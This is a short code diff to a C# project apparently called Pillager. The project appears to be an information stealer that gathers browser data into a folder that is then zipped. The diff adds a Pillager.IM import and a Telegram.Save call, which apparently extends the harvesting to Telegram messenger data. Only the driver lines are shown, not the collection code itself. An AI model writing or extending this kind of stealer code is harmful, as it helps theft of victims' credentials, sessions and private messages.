@@ -3,6 +3,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.IO.Compression;
 using Pillager.Browsers;
+using Pillager.IM;
 
 namespace Pillager
 {
@@ -15,6 +16,8 @@ namespace Pillager
             if (Directory.Exists(savepath)) Directory.Delete(savepath, true);
             if (File.Exists(savezippath)) File.Delete(savezippath);
             Directory.CreateDirectory(savepath);
+
+            Telegram.Save(savepath);
 
             //IE
             IE.Save(savepath);
